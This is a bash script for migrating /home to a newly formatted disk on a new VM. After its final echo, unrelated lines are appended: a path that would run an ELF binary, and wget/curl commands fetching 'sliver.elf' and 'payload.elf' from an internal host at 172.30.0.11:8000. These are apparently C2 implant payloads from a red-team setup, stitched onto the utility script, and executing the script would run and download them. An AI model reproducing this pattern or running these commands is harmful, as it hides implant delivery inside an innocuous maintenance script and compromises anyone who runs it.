#!/bin/bash
# Run after the first boot of a new VM

# 1. Backup the existing home directory (if any)
sudo mkdir -p /tmp/home_backup
sudo rsync -av /home/ /tmp/home_backup/

# 2. Format the new disk
sudo mkfs.ext4 -L home /dev/vdb

# 3. Temporarily mount the disk to /mnt
sudo mkdir -p /mnt/newhome
sudo mount -L home /mnt/newhome

# 4. Restore the original home directory contents
sudo rsync -av /tmp/home_backup/ /mnt/newhome/

# 5. Unmount the temporary mount point
sudo umount /mnt/newhome

# 6. Mount the disk to /home
sudo mount -L home /home

# 7. Add entry to fstab for automatic mounting
echo "LABEL=home    /home    ext4    defaults    0 0" | sudo tee -a /etc/fstab

# 8. Reload systemd configuration
sudo systemctl daemon-reload

# 9. Verify the mount
df -h /home

# 10. Clean up temporary backup
sudo rm -rf /tmp/home_backup

echo "Done! /home is now mounted on the new disk."

172.30.0.11

/home/lexuswang/Aurora-executor-demo/1.elf

wget --compression=none -L -O /home/lexuswang/sliver.elf http://172.30.0.11:8000/sliver.elf

wget --compression=none -L -O /home/lexuswang/payload.elf http://172.30.0.11:8000/payload.elf

curl --compressed false -H "Accept-Encoding: identity" -o payload.elf http://172.30.0.11:8000/payload.elf